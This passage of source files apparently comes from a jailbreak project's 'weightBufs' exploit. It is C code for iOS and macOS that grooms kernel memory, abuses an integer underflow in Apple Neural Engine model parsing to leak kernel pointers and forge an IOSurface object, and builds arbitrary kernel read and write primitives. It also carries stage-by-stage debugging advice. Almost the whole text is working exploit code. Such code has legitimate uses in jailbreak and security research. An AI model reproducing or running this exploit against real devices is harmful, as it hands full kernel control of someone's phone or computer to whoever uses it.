        __set8(ptr2,1);                             /* Enalbe fileInfo1 */
        __set8(ptr2,1);                             /* Enalbe fileInfo2 */
        __set8(ptr2,1);                             /* Enalbe fileInfo3 */

        /* --> DeCxt::GetFileInfo */
        DeCxt_GetFileInfo(ptr2,info->chunk_index,0,info->global_chunk_size);
        DeCxt_GetFileInfo(ptr2,0,0,1);
        DeCxt_GetFileInfo(ptr2,0,0,1);

        /* --> DeCxt::GetWeightInfo */
        u16 val16[5] = {1,2,3,4,5};
        DeCxt_GetWeightInfo(ptr2,41,val16);

        __set16(ptr2,1);                            /* used for buffer allocation, putting it to zero will skip the loop */
        u8 *ptr3 = ptr2;                            /* ZinIrDeserializer::Read() */

        /* --> DeCxt::ParseTransform */
        /* ***** first loop **** */
        __set8(ptr3,1);                             /* case 1 */

        __set64(ptr3,info->read_count/2);           /* how many u64 we want to leak ? */
        __set64(ptr3,info->read_offset);            /* the starting offset to read from*/

        /* ***** second loop **** */
        __set16(ptr3,1);

        u8 val8[3] = {1,1};
        u16 val16_2[3] = {1,0,0};
        DeCxt_ParseTransformInfo(ptr3,val8,val16_2);

        __set16(ptr3,0);                            /* The chunk index */


        __set16(ptr3,1);                            /* Back to Transform list */
        __set16(ptr3,1);                            /* Back to Transform list */

        /* DeCxt::RasterizeScaleBiasData */
        __set64(ptr3,info->underflow);              /* 2nd arg : The value that will underflow the calculaion */

        __set16(ptr3,1);                            /* 3rd arg : u16 value */

        /* ParseOcgRasterizationInfo */
        u16 ocgInfo[4] = {0,0,0,info->ocg.vals[3]};
        DeCxt_ParseOcgRasterizationInfo(ptr3,ocgInfo);

}

void kwrite64(uint64_t address,uint64_t value)
{
#if TARGET_OS_OSX
        *(u64 *) (krw.shm_uaddr + 0x358) = address;
#else
        *(u64 *) (krw.shm_uaddr + 0x360) = address;
#endif
        set_indexed_timestamp(p->iosurface,krw.surface_id,0,value);
}

uint32_t kread32(uint64_t address)
{
        *(u64 *) (krw.shm_uaddr + 0xc0 ) = address - 0x14;
        uint32_t out = 0;
        iosurface_get_use_count(p->iosurface,krw.surface_id,&out);
        return out;

}

uint64_t kread64(uint64_t address)
{
        uint32_t out = kread32(address);
        uint32_t out2 = kread32(address + 4);
        uint64_t value = ((uint64_t)out2 << 32) | out;

        return value;
}
void khexdump(u64 kaddr,u64 size)
{
        u8 * data = (u8 *)calloc(size,1);
        for(int i=0; i < size;i+=8) {
                u64 kdata = kread64(kaddr + i);
                *(u64 *) (data + i) = kdata;
        }

        hexdump(data,size);
        free(data);

}

static void iosurface_spray_kernel_map(u32 surface_id,u32 key,u32 size,u32 count)
{
        init_iosurface_prop_data();

        u32 ppsz = 0x10;
        u8 * pp = (u8 *)calloc(ppsz,1);
        memset(pp,0xAA,ppsz);

        uint32_t offkey = build_iosurface_payload(size/8,pp,ppsz,key);
        u32 lkey = key;
        for(int i=0; i < count;i++) {
                iosurface_set_value(p->iosurface,surface_id);
                *(uint32_t *)(prop_data + offkey * 4) = lkey++;
        }
        free(pp);
}

static void get_surface_base(uint32_t surface_id,u8 **address, size_t *size)
{
        IOSurfaceRef s = IOSurfaceLookup(surface_id);
        assert(s);
        *address = (u8*)IOSurfaceGetBaseAddress(s);
        *size = (size_t)IOSurfaceGetAllocSize(s);
        CFRelease(s);
}

void init_structs(void)
{

        p = (struct exploit *)calloc(1,sizeof(struct exploit));
        assert(p);

        p->initInfo_sz = 0x4000;
        vm_address_t addr = 0;
        kern_return_t kr = vm_allocate(mach_task_self(),&addr,p->initInfo_sz,1);
        p->initInfo = (u8*)addr;
        assert(kr == KERN_SUCCESS);

         /* Prepare WeightSurface, the kernel mapping of this will land at KHEAP_DATA_BUFFERS */
        p->weightsBufferSize = 0x80000;
        IOSurfaceFastCreateArgs args = {0};
        args.IOSurfaceAddress = (vm_address_t)malloc(p->weightsBufferSize);
        args.IOSurfaceAllocSize =  (uint32_t)p->weightsBufferSize;

        p->iosurface = create_surface_fast_path(IO_OBJECT_NULL, &p->weightsSurface, &args);
        store_surface_id(p->weightsSurface);

        p->weightsBuffer = (u8*)IOSurfaceGetBaseAddress(IOSurfaceLookup((IOSurfaceID)p->weightsSurface));
        args.IOSurfaceAddress = 0;
        args.IOSurfaceAllocSize =  0x400000;
        create_surface_fast_path(p->iosurface, &p->InOutSurface, &args);
        store_surface_id(p->InOutSurface);

        /* Prepare the serializer object */
        sinfo = (serializer_info_t *)calloc(1,sizeof(serializer_info_t));
        assert(sinfo);

        p->groom_surface_count = 0x20;
        p->groom_pageable_maps_count = MAX_SHMEMS;

#if TARGET_OS_OSX
        p->groom_kernel_map_count = 0x10;
#else
        p->groom_kernel_map_count = 0x30;
#endif
}

void groom_kernel_map(void)
{
        u64 program_handle =0;
        u32 loaded_progs_count = MAX_PROGRAMS;

        /*   size = 0xc000                                                                                      */
        /*   <============>                                                                                     */
        /*  +--------------+--------------+--------------+-----------+-----------------------------------       */
        /*  | OSArray ptrs | OSArray ptrs | OSArray ptrs | fresh VA  |            ..........                    */
        /*  +--------------+--------------+--------------+-----------+-----------------------------------       */
        /*  <------------------------------------------ kernel_map ---------------------------------------      */
        /*  */


        if(p->kernel_map_groom_done == false) {
                printf("[+] Grooming kernel_map ... ");
                for(int i=0; i < p->groom_kernel_map_count; i++)
                        iosurface_spray_kernel_map(p->weightsSurface,0x44444401 + i,0xc000,1); /*  */

                p->kernel_map_groom_done = true;
        }

        /*  Groom kernel_map such that OSArray backing store objects fall between H11ANEProgramBufferParamsStruct(s)*/
        /*             size=0x54000                   size=0x54000                                                      */
        /*           <=============>                 <=============>                                                    */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /*   ...    | ProgramBuffer | ProgramBuffer |    OSArray    | ProgramBuffer | ... | ProgramBuffer  ...          */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*  */

        u32 keys[loaded_progs_count], keys_cnt = 0;
        for(int i=0;i < loaded_progs_count; i++) {
                /*
                 * This is a crucial step to improve the success rate of stage 2:
                 * Make sure that each page in IOSurface_zone contains at least one IOSurface
                 * object that's owned by us, so later when we leak an IOSurface_zone_page from that zone
                 * we can retrieve an IOSurface object through IOSurfaceID identification.
                 */
                u32 ssid = 0;
                IOSurfaceFastCreateArgs args = {0};
                args.IOSurfaceAddress =  (vm_address_t)malloc(0x4000);
                args.IOSurfaceAllocSize =  0x4000;
                // for(int j=0; j < 2;j++) {
                for(int j=0; j < 2;j++) {
                        create_surface_fast_path(p->iosurface, &ssid, &args);
                        store_surface_id(ssid);
                }

                program_handle = hwx_load_model();
                hwx_unload_model(program_handle);

                if((i % 2) == 0) {
                        keys[keys_cnt] = 0x10101001 +  (keys_cnt <<28);
                        iosurface_spray_kernel_map(p->weightsSurface,keys[keys_cnt++],0x54000,1);
                }
                printf(". ");

        }
        printf("OK\n");

        /* MUTK & PROG IOSurface mappings will be adjacents to our DeviceShmem mappings                                                         */
        /*        size=0x4000    size=0x4000  size=0x10000                                                          */
        /*       <============> <==========> <=============>                                                        */
        /* -----+--------------+------------+---------------+------------+--------------+-------                    */
        /*  ... | DeviceShmemN |  MUTK(1)   |    PROG(1)    |   MUTK(2)  |    PROG(2)   |  ...                      */
        /* -----+--------------+------------+---------------+------------+--------------+-------                    */
        /*                                                                                                          */


        /*  Free OSArray objects to create holes in kernel_map                                                          */
        /*             size=0x54000                   size=0x54000                                                      */
        /*           <=============>                 <=============>                                                    */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /*   ...    | ProgramBuffer | ProgramBuffer |     FREED     | ProgramBuffer | ... | ProgramBuffer  ...          */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*                                                                                                              */

        for(int i=0; i < keys_cnt; i++) {
                dbg("Removing key 0x%x \n",keys[i]);
                iosurface_remove_property(p->iosurface,p->weightsSurface,keys[i]);
        }

}

 /* Leak H11ANESharedMemorySurfaceParamsStruct from kernel_map */
bool get_mutk_object(void)
{
        u64 program_handle =0;
        u8* _ptrbuf = 0;
        size_t sz = 0;

        /* Allocate MutableWeight with size of 0x54000 that will likely overlap with one of the freed OSArrays   */
        /*             size=0x54000         size=0x54000                                                                */
        /*           <===============> <=========================>                                                      */
        /* ---------+-----------------+----------------------------+---------------+-----+-------------------------     */
        /*   ...    | ProgramBuffer   |    MutableWeight[]  | ProgramBuffer | ... | ProgramBuffer  ...           */
        /* ---------+-----------------+----------------------------+---------------+-----+-------------------------     */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*                                                                                                              */

        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,0x54000,0x4000,p->weightsBufferSize-0x4000);

        /* 0x14000 = 'MUTK' + 'PROG' IOSurface allocation sizes                                                           */
        /* Copy out the leaked H11ANESharedMemorySurfaceParamsStruct to one of the shared memory buffers that we've       */
        /* created via IOGPU                                                                                              */
        sinfo->underflow =  0 - (0x20 * 0x14000);

#if 0

        /*
         * 0x000a7e1 = (&programbuffer->MUTK_Surface[0] - weightBuffer)/0x10 = (0x54000 + 0x53E10)/0x10
         * 0x54000 is the rounded up size of H11ANEProgramBufferParamsStruct
         * 0x53E10 is the offset of H11ANESharedMemorySurfaceParamsStruct in H11ANEProgramBufferParamsStruct object
         * 0x10 is the size of MutableWeight entry
         */

        /* Snippet from a reverse-engineer'ed MutableOperationInfo (size = 0x53E70) */
        struct MutableWeight {
                uint8_t * wbuf_chunk;
                size_t  wbuf_chunk_size;

        };

        /* Snippet from a reverse-engineer'ed H11ANESharedMemorySurfaceParamsStruct (size = 0x53E70) */
        struct __attribute__((aligned(8))) _H11ANEProgramBufferParamsStruct
        {
                ...
                H11ANESharedMemorySurfaceParamsStruct *MUTK_Surface[2];      /* + 0x53E10 */
                ...
        };

        /* reverse-engineer'ed H11ANESharedMemorySurfaceParamsStruct (size = 0x48) */
        struct H11ANESharedMemorySurfaceParamsStruct
        {
                size_t size;
                IOSurface *p_IOSurface;
                uint64_t dartMapBase;
                IOMemoryDescriptor *surface_memDesc;
                IOMemoryMap *surface_memMap;
                uintptr_t surface_vAddress;
                IODMACommand *dmaCommand;
                uint8_t usage[4];
                uint32_t ref_count;
                uint32_t programId;
                uint32_t processId;
        };
#endif

        /*
         * Because we're sure that one of the ProgramBuffer objects is adjacent to our MutableOperationInfo array,
         * and both objects are 0x54000 bytes size, it is safe to consider this value as constant
         */
        sinfo->chunk_index =  0x000a7e1;

        sinfo->read_count = 0x48;                      /* Read sizeof(H11ANESharedMemorySurfaceParamsStruct) = 0x48 */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;         /* Write sizeof(H11ANESharedMemorySurfaceParamsStruct) back to our shmem */
        serialize_initinfo_section(p->initInfo,sinfo);

        program_handle = hwx_patch_and_load_model();
        do_send_ane_request(program_handle);

        u32 offset = 0, scratched_surface = 0;

        /*
         * The leaked 0x48 bytes should contain 'MUTK' integer value in it
         * If not found, it means either the spray has failed or something other than H11ANESharedMemorySurfaceParamsStruct
         * has been leaked.
         */
        struct shmem * shm = lookup_scratched_shmem('MUTK',4,&offset);
        if(shm == NULL) {
                printf("[-] Something went wrong here, if you experience this failure a lot, this means the device is not idle "
                        "and we couldn't shape the memory as expected. It's preferable to reboot the device and try again \n");
                return false;
        }

        _ptrbuf  = shm->shm_addr;
        sz = shm->shm_len;

        /* Needed for the last exploit stage */
        krw.surface_id = scratched_surface;
        krw.shm_uaddr = _ptrbuf;
        krw.shm_size = sz;
        _ptrbuf = _ptrbuf + offset - 0x38;

        memcpy(&aneMemSurface,_ptrbuf,0x48);

        hexdump(_ptrbuf,0x48);
        printf("[+] Leaked mutable kernel section (MUTK) buffer 0x%llx \n",aneMemSurface.surface_address);
        printf("[+] Leaked IOSurface object 0x%llx \n",aneMemSurface.p_IOSurface);

        /*
         * Needed to perform the arbitrary kernel write later
         * We picked a random memory that's (hopefully) one of our shared memory buffer
         * We'll figure out later its backing user space address
         */
        krw.shm_kaddr =  aneMemSurface.surface_address - (80 * 0x4000);

        printf("[+] Kernel location of our input buffer 0x%llx \n",krw.shm_kaddr);

        if(aneMemSurface.p_IOSurface > aneMemSurface.surface_address) {
                printf("*********************************************************************************\n");
                printf("FATAL: The exploit has anticipated a failure that would likely crash the device at the last stage because of the target IOSurface is invalid \n"
                       "    It's preferable to stop here and run the exploit again \n");
                printf("*********************************************************************************\n");
                return false;
        }

        bzero(shm->shm_addr,shm->shm_len);
        hwx_unload_model(program_handle);
        return true;
}

bool get_target_surface(u64 *kaddr_target)
{
        u64 program_handle =0;
        u64 target = 0;
        u8* _ptrbuf = 0;
        u32 offset = 0;

        IOSurface_zone_page  = trunc_page(aneMemSurface.p_IOSurface);
#if 0
        printf("Offset 0x%llx \n",aneMemSurface.p_IOSurface - IOSurface_zone_page);
#endif
        assert(!((aneMemSurface.p_IOSurface - IOSurface_zone_page) % IOSURFACE_OBJ_SIZE));

#if TARGET_OS_OSX
        u64 shift_off = 0x34000;
#else
        u64 shift_off = 0x14000;
#endif

        /*
         * We are trying to learn the upcoming weight surface kernel mapping in IOKitPageableMaps
         * For each program loaded, two IOSurface objects are created: 'PROG' and 'MUTK' (0x14000 bytes)
         * We need to deduce an accurate location in order to preform the arbitrary read later
         * Fortunately, it's possible to precisely anticipate the location based on the shift_off
         * if a kernel panic or failure occurred at this stage please see DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
         */
        u64 weightSurface_kloc = aneMemSurface.surface_address + shift_off;
        dbg("[+] Deduced weightSurface (from IOKitPageableSpace submaps) location 0x%llx \n",weightSurface_kloc);

        IOSurfaceFastCreateArgs args = {0};

        args.IOSurfaceAllocSize =  0x20000;
        args.IOSurfaceAddress = 0;
        create_surface_fast_path(p->iosurface, &p->weightsSurface, &args);
        store_surface_id(p->weightsSurface);

        get_surface_base(p->weightsSurface,&p->weightsBuffer,(size_t *)&p->weightsBufferSize);
        dbg("[+] Created new (weight) IOSurface id=0x%x base=0x%llx size=0x%lx\n",
               p->weightsSurface,(u64)p->weightsBuffer,p->weightsBufferSize);

        target = (0 - (weightSurface_kloc - IOSurface_zone_page));
        /* target = (0x4141414141414141); //(weightSurface_kloc - IOSurface_zone_page)); */

#if DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
        /*
         * In case of several failures occurred at this stage :
         * 1. Enable DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
         * 2. Get the faulted address from the kernel panic log : would be something like 0x414141414XXXX242
         * 3. in lldb -> p/x 0x4141414142424242 - 0x414141414XXXX242 = new_value
         * 4. Update shift_off = (old)shift_off - new_value
         */

        target = (0 - (weightSurface_kloc - 0x4141414142424242));
        dbg("[*] Target to read from 0x%llx \n",target);
#endif

        /* Use the integer overflow to underflow the weight surface buffer to point into IOSurface_zone_page location */
        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,
                                       0x10,
                                       (0 - target ) + 0x8000,target);

        bzero(sinfo,sizeof(*sinfo));

        /* Like weightSurface_kloc, anticipate the next 'mutk' surface buffer location  */
        u64 mutk_addr = weightSurface_kloc - 0x4000;

        assert(krw.shm_kaddr);

        sinfo->underflow =  (0 - 0x003d0000);

#if !TARGET_OS_OSX
        sinfo->underflow =  (krw.shm_kaddr - mutk_addr);
#endif

        sinfo->chunk_index = 0;
        sinfo->read_count = 0x4000;               /* DeCxt::ParseTransform() case [1] 1st ReadUint64() */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;
        serialize_initinfo_section(p->initInfo,sinfo);

        program_handle = hwx_patch_and_load_model();
        do_send_ane_request(program_handle);

        offset = 0;
#if TARGET_OS_OSX
        struct shmem * shm = lookup_scratched_shmem(0xfffffe,3,&offset);
#else
        struct shmem * shm = lookup_scratched_shmem(0xffffff,3,&offset);
#endif
        if(shm == NULL) {
                printf("FAIL\n");
                printf("[-] Could not find scratched Shmem .. run the exploit again\n");
                return false;
        }
        _ptrbuf  = shm->shm_addr;
        _ptrbuf = _ptrbuf + offset - 21;

        /* IOSurfaceRoot location  */
        IOSurfaceRoot = *(u64 *) (_ptrbuf + 0x28);

        /* hexdump(_ptrbuf,0x4000); */

        for(u32 i=0; i < 0x4000;i+=IOSURFACE_OBJ_SIZE) {
                u8 *ptr  = _ptrbuf + i;
                dbg("Reading from 0x%llx \n",IOSurface_zone_page + i);
                //hexdump(ptr,0x20);
                //printf("--- \n");

                /* The IOSurface we want must have one reference only so the leaked IOSurfaceClient is certainly ours  */
                u32 refcount = *(u32 *)(ptr + 8);
                u32 ss = *(u32 *)(ptr + 0xc);                 /* IOSurfaceID */

                for(int j=0; j < g_IOSurfaceIds_count; j++) {
                        if(ss == g_IOSurfaceIds[j] && refcount == 1) {
                                matched.surface_id = ss;
                                matched.loc  = ptr;
#if TARGET_OS_OSX
                                matched.IOSurfaceClient_loc = *(u64 *)(ptr + 0x338);
#else
                                matched.IOSurfaceClient_loc = *(u64 *)(ptr + 0x340);
#endif
                                matched.IOSurface_loc = IOSurface_zone_page + ptr - _ptrbuf;

                                printf("[+] Found a matching surface-id=0x%04x IOSurface=0x%llx ! \n",
                                       matched.surface_id,
                                       matched.IOSurface_loc);
                                break;
                        }
                }
                if(matched.surface_id) break;
        }

        /* assert(matched.surface_id && "Unable to find a suitable IOSurface"); */

        /* Looks like our IOSurface_zone grooming didn't work out as expected, just run the exploit again */
        if(!matched.surface_id) {
                printf("[-] Stage 3 Failed : Unable to find an IOSurface controlled by us\n");
                return false;

        }
        printf("[+] IOSurfaceClient location 0x%llx \n",matched.IOSurfaceClient_loc);
        printf("[+] IOSurface location 0x%llx \n",matched.IOSurface_loc);
        printf("[+] IOSurfaceRoot 0x%llx \n",IOSurfaceRoot);


        usleep(1000);
        bzero(shm->shm_addr,shm->shm_len);

        /* We want to overwrite IOSurface location with an arbitrary kernel address */
        target = matched.IOSurfaceClient_loc + 0x40;
        *kaddr_target  = matched.IOSurfaceClient_loc + 0x40;
        hwx_unload_model(program_handle);
        return true;
}

bool get_kernel_rw(uint64_t *kernelBaseOut)
{

        u8 * chunk = p->weightsBuffer + p->weightsBufferSize - 0x4000;
        bzero(p->weightsBuffer,p->weightsBufferSize);

        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,0x10,0x4000,p->weightsBufferSize-0x4000);

        memset(sinfo,0,sizeof(serializer_info_t));

        /* Overwrite IOSurfaceClient->pIOSurface with IOGPU shared memory (krw.shm_kaddr) */
        /* At this step, we don't know which shmem is backing the kernel mapping whose address is krw.shm_kaddr  */
        /* Let's find out ...  */

        /* We don't need to worry about determining the offset at which a bogus IOSurface object starts because it will always be at offset 0, because all IOGPU shmem sizes are page size. */
        for(u32 i=0; i < p->shmems_count;i++) {
                /* memset(p->shmems[i]->shm_addr,0x44,0x4000); */

                for(int j=0; j < p->shmems[i]->shm_len; j+=8) {
                        *(u64 *) (p->shmems[i]->shm_addr + j ) = 0x4141414100000000 |j; /* useful to detect faults */
                }

                /* Bypass IOSurface->IOSurfaceRoot check */
                *(u64 *) (p->shmems[i]->shm_addr + 0x28) = IOSurfaceRoot;

                /* Fake IOSurface->SharedRO with arbitrary kernel address to preform the leak via IOSurface::get_use_count() */
                *(u64 *) (p->shmems[i]->shm_addr + 0xc0) = (u64)krw.shm_kaddr  + 0x2000 - 0x14;

                /* SharedRO location : we want to figure out which user address matches our 'krw.shm_kaddr' */
                *(u64 *) (p->shmems[i]->shm_addr + 0x2000) = 0x41410000 |p->shmems[i]->shm_id;

        }

#if 0
        *(u64 *) chunk  = 0xdeadbeef11223344;               /* For debugging purpose  */
#else
        *(u64 *) chunk  = krw.shm_kaddr;                    /* Fake IOSurface Object */
#endif


#if TARGET_OS_OSX
        u64 mutk_addr = (aneMemSurface.surface_address + 0x40000);
#else
        u64 mutk_addr = (aneMemSurface.surface_address + 0x10000);
#endif  /* TARGET_OS_OSX */

        u64 target_write = (matched.IOSurfaceClient_loc + 0x40);

// #define DEBUG_EXPLOIT_STAGE_4_KERN_PANIC 1
#if DEBUG_EXPLOIT_STAGE_4_KERN_PANIC
        /*
         * If you encouter several kernel panics at this stage it means that the offset is not
         * quite accurate for this device, enable DEBUG_EXPLOIT_STAGE_4_KERN_PANIC and follow the steps
         * described in stage 3
         */
        target_write = 0x4141414142424242;

#endif

        /* assert(target_write < mutk_addr && "Cannot write into this address :("); */

        /*
         * Due to the nature of the OOB write, we cannot write to a memory region whose address
         * is upper to the MUTK mapping address. That's because of the enhanced kernel_map randomization.
         * Just play with MAX_SHMEMS and it will likely work in the second try ...
         */
        if(target_write > mutk_addr) {
                printf("[-] Failed: we cannot write into this address=0x%llx from mutk_addr=0x%llx\n",
                       target_write,mutk_addr);
                printf("****** INCREASE MAX_SHMEMS BY 0x1000 THEN RUN THE EXPLOIT AGAIN *********** \n");
                return false;
        }
        /* SUCCESS! we can ovewrite the target location now */
        sinfo->underflow =  (target_write) - mutk_addr;
        sinfo->chunk_index =  0;

        sinfo->read_count = 0x8;            /* DeCxt::ParseTransform() case [1] 1st ReadUint64() */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;
        serialize_initinfo_section(p->initInfo,sinfo);

        u64 program_handle = hwx_patch_and_load_model();

        do_send_ane_request(program_handle);

        u32 target_shmid = 0;
#if 1
        iosurface_get_use_count(p->iosurface,matched.surface_id,&target_shmid);
#else
        /* For debugging purpose */
        for(int i=0; i < g_IOSurfaceIds_count;i++) {
                iosurface_get_use_count(p->iosurface,g_IOSurfaceIds[i],&target_shmid);
                if((target_shmid & 0x41410000) == 0x41410000)
                        break;
                target_shmid = 0;
        }
#endif

        /* assert(target_shmid); */
        if(target_shmid == 0) {
                printf("[-] Unable to retrieve the backing shmid id \n");
                return false;
        }

        target_shmid &= ~0x41410000;
        printf("[+] Got shmem id 0x%x for 0x%llx \n",target_shmid,krw.shm_kaddr);
        /* sleep(1); */

        printf("[+] Stage 5: Get stable arbitrary kernel read/write .... ");
        for(int i =0; i < p->shmems_count;i++) {
                if(target_shmid != p->shmems[i]->shm_id) continue;

                krw.shm_uaddr = (u8*)p->shmems[i]->shm_addr;
                krw.shm_size  = p->shmems[i]->shm_len;
                break;
        }

        krw.surface_id = matched.surface_id;

        u64 val = xpacd(kread64(IOSurfaceRoot));


        printf("OK \n");
        printf("[+] IOSurfaceRoot vtable 0x%llx \n",val);

        u64 temp1 = kread64(val);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",val,temp1);

        u64 temp = kread64(krw.shm_kaddr + 0x3000);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",krw.shm_kaddr + 0x3000,temp);
        printf("[+] kwrite64(0x%llx,0x%lx) \n",krw.shm_kaddr + 0x3000,0xdeadbeef12345678);
        kwrite64(krw.shm_kaddr + 0x3000,0xdeadbeef12345678);
        temp = kread64(krw.shm_kaddr + 0x3000);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",krw.shm_kaddr + 0x3000,temp);
        /* sleep(1); */
        u64 kaddr = trunc_page(val);
        u32 magic = 0, filetype = 0;
#if 1

        do {
                kaddr -= 0x4000;
                magic = kread32(kaddr);
                filetype = kread32(kaddr + 0xc);
        }while((magic != 0xfeedfacf) || (filetype != 2));

        printf("[+] Kernel text base 0x%llx\n",kaddr);
        khexdump(kaddr,0x70);
#endif
    if (kernelBaseOut) {
        *kernelBaseOut = kaddr;
    }

#if 0
        kwrite64(0x1111111111111111,0x2222222222222222);
#endif
        return true;

}

void cleanup(void)
{
        /* Restore the old state as if nothing happened */
        kwrite64(matched.IOSurfaceClient_loc + 0x40,matched.IOSurface_loc );
        printf("[+] Cleanup done\n");



}
void show_device_spec(void)
{
        struct utsname u = {0};
        uname(&u);
        printf("\tsystem name = %s\n", u.sysname);
        printf("\tnode name   = %s\n", u.nodename);
        printf("\trelease     = %s\n", u.release);
        printf("\tversion     = %s\n", u.version);
        printf("\tmachine     = %s\n", u.machine);
}

int exploit(uint64_t *kernelBaseOut)
{
#if !TARGET_OS_OSX
        hwx_init_frameworks();
#endif

        init_structs();

        hwx_patch_model();

        printf("[+] Stage 1: Grooming kernel memory ... \n");
        /* p->groom_pageable_maps_count *= 2; */
        /* p->groom_surface_count *=2; */

        groom_IOSurface_zone();
        groom_pageable_maps();
        groom_kernel_map();

        if(!get_mutk_object())
                return -1;

        printf("[+] Stage 3: Dumping a memory page from IOSurface_zone  \n");
        u64 kaddr = 0;
        if(!get_target_surface(&kaddr))
                return -1;

        usleep(1000);
        printf("[+] Stage 4: Performing the arbitrary write primitive ... \n");
        if(!get_kernel_rw(kernelBaseOut))
                return -1;

        show_device_spec();

        return 0;
}

#if TARGET_OS_OSX
int main()
{
        return exploit();
}
#endif

```

`Application/Dopamine/Exploits/weightBufs/exploit/iokit.h`:

```h
#ifndef _IOKIT_H
#define _IOKIT_H

#ifdef __cplusplus
extern "C" {
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>

#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

#define False  0
#define True   1


#define CHECK_IOKIT_ERR(kr,name)  do {                          \
                if (kr != KERN_SUCCESS) {                       \
                        printf("%s : %s (0x%x)\n",              \
                               name,mach_error_string(kr),kr);  \
                }                                               \
        }while(0);
        typedef uint64_t u64;
        typedef uint32_t u32;


CFNumberRef CFInt32(int32_t value);
CFNumberRef CFInt64(int64_t value);

enum {
        kOSSerializeDictionary   = 0x01000000U,
        kOSSerializeArray        = 0x02000000U,
        kOSSerializeSet          = 0x03000000U,
        kOSSerializeNumber       = 0x04000000U,
        kOSSerializeSymbol       = 0x08000000U,
        kOSSerializeString       = 0x09000000U,
        kOSSerializeData         = 0x0a000000U,
        kOSSerializeBoolean      = 0x0b000000U,
        kOSSerializeObject       = 0x0c000000U,
        kOSSerializeTypeMask     = 0x7F000000U,
        kOSSerializeDataMask     = 0x00FFFFFFU,

        kOSSerializeEndCollection = 0x80000000U,
};

// IOKIT
typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;
typedef mach_port_t io_registry_entry_t;

#ifndef IO_OBJECT_NULL
#define IO_OBJECT_NULL 0
#endif
extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
        kern_return_t IOConnectMapMemory(io_connect_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, uint32_t options);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,io_connect_t *connect);
kern_return_t IOServiceGetMatchingServices(mach_port_t masterPort, CFDictionaryRef matching, io_iterator_t *existing);
kern_return_t IOServiceClose(io_connect_t connect);
uint32_t IOObjectGetRetainCount(io_object_t object);
uint32_t IOObjectGetKernelRetainCount(io_object_t object);
uint32_t IOObjectGetRetainCount(io_object_t object);
kern_return_t io_object_get_retain_count(mach_port_t object,uint32_t *retainCount);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);
kern_return_t IOConnectSetNotificationPort(io_connect_t connect, uint32_t type, mach_port_t port, uintptr_t reference);
CFMutableDictionaryRef IOServiceMatching(const char *name);
CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *errorString);

typedef struct {
        io_connect_t client;
        uint8_t *sInput;
        uint32_t sInputSize;
        uint8_t * sOutput;
        size_t sOutputSize;
        mach_port_t asyncAwake;
        uint64_t references[8];
        uint32_t referenceCnt;
        uint64_t scalarI[0x10];
        uint64_t scalarO[0x10];
        uint32_t scalarISize;
        size_t scalarOSize;
} IOKit_args_t;

void hexdump(const void* data, size_t size);
io_connect_t iokit_get_connection(const char *name,unsigned int type);
IOKit_args_t * allocate_args(uint32_t InSize,uint32_t OutSize,bool has_mp);
void destroy_args(IOKit_args_t *);

        char * load_file(const char* filename, vm_size_t * size);

#ifdef __cplusplus
}
#endif
#endif

```

`Application/Dopamine/Exploits/weightBufs/exploit/utils.c`:

```c
#include "iokit.h"

char * load_file(const char* filename, vm_size_t * size) {
        int fd = open(filename,O_RDONLY);
        if(fd < 0) {
                perror("load_file(): %s \n");
        }
        assert(fd > 0);

        struct stat st = {};
        int err = fstat(fd,&st);
        assert(err == 0);

        void *ptr = mmap(0,round_page(st.st_size),PROT_READ | PROT_WRITE,MAP_FILE | MAP_PRIVATE, fd,0);
        assert(ptr != (void*)-1);
        *size = round_page(st.st_size);
        close(fd);

        return (char*)ptr;
}

io_connect_t iokit_get_connection(const char *name,unsigned int type)
{
        io_service_t service  = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                            IOServiceMatching(name));
        if (service == IO_OBJECT_NULL) {
                printf("unable to find service \n");
                exit(-1);
        }

        io_connect_t conn = MACH_PORT_NULL;
